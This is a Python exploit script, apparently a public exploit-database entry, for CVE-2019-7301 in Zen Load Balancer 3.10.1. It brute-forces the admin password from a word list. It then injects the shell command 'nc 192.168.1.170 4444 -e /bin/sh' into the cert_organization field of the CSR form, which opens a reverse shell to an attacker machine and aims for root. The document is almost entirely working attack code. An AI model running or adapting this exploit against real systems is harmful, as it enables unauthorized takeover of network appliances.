# Google Dork: no
# Exploit Author: Cody Sixteen
# Vendor Homepage: https://code610.blogspot.com
# Software Link: https://sourceforge.net/projects/zenloadbalancer/files/Distro/zenloadbalancer-distro_3.10.1.iso/download
# Version: 3.10.1
# Tested on: Linux 
# CVE : CVE-2019-7301

#c@kali:~/src/eonila/zenload3r$ cat zenload3r.py
#!/usr/bin/env python
# zenload3r.py - zen load balancer pwn3r
# 28.03.2020 @ 22:41
#
# by cody sixteen
#

import base64
import sys, re
import requests
import ssl
from functools import partial
ssl.wrap_socket = partial(ssl.wrap_socket, ssl_version=ssl.PROTOCOL_TLSv1)
# disable ssl warnings:
import urllib3
urllib3.disable_warnings()
from requests.auth import HTTPBasicAuth

#
target = sys.argv[1]
username = &#039;admin&#039;
password = &#039;P@ssw0rd&#039;

def main():
  print &#039;zenload3r.py - zen load balancer pwn3r&#039;
  print &#039;      zenload3r.py - vs - %s&#039; % ( target )
  print &#039;&#039;

  print &#039;[+] checking if host is alive...&#039;
  global sess
  sess = requests.session()
  global baseUrl
  baseUrl = target + &#039;:444/index.cgi&#039;
  checkBaseUrl = sess.get(baseUrl, verify=False)
  checkBaseResp = checkBaseUrl.status_code

  #print checkBaseResp
  if checkBaseResp == 401:
    print &#039;[i] ...it is. we need to log in to proceed&#039;
    logmein(baseUrl)


def logmein(target):
  print &#039;[+] trying %s and default password "%s" vs %s&#039; % (username, password, baseUrl)

  #pwd_file = &#039;/usr/share/wordlists/dirb/common.txt&#039;
  pwd_file = &#039;passwd.lst&#039;

  try:
    read_pwds = open(pwd_file, &#039;r&#039;)
    pwds = read_pwds.readlines()

    for pwd in pwds:
      pwd = pwd.rstrip()
      logme = sess.post(baseUrl, auth=HTTPBasicAuth(username,pwd), allow_redirects=True)
      logmeresp = logme.text

      #print logmeresp
      if &#039;<p>Hello <strong>admin</strong>&#039; in logmeresp:
        print &#039;[+] admin user logged-in! :D&#039;
        print &#039;[+] working password: %s&#039; % ( pwd )

        load3r(baseUrl, pwd)

  except requests.exceptions.ConnectionError:
    print &#039;[-] Can not connect to remote host :C\n&#039;


def load3r(baseUrl, pwd):

  creds = base64.b64encode("{}:{}".format(username,pwd))
  creds2 = creds.rstrip()
  print &#039;creds: &#039;, creds2

  baseUrl = "https://192.168.1.200:444/index.cgi"
  headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://192.168.1.200:444",
    "Authorization": "Basic {}".format(creds2), "Connection": "close",
    "Referer": "https://192.168.1.200:444/index.cgi?id=1-3&action=Show_Form", "Upgrade-Insecure-Requests": "1"
  }
  sh = "a\";nc 192.168.1.170 4444 -e /bin/sh;#"
  reqdata = {"cert_name": "qweqweqwe", "cert_issuer": "Sofintel",
    "cert_fqdn": "qweqweqwe", "cert_division": "qweqweqwe",
    "cert_organization": sh,
    "cert_locality": "qweqweqwe", "cert_state": "qweqweqwe",
    "cert_country": "qw", "cert_mail": "qweqweqwe@qweqweqwe.com",
    "cert_key": "2048", "id": "1-3", "actionpost": "Generate CSR", "button": "Generate CSR"}

  requests.post(baseUrl, headers=headers, data=reqdata,verify=False)

  print &#039;[*] got r00t? ;>\n&#039;


# run me:
if __name__ == &#039;__main__&#039;:
  main()

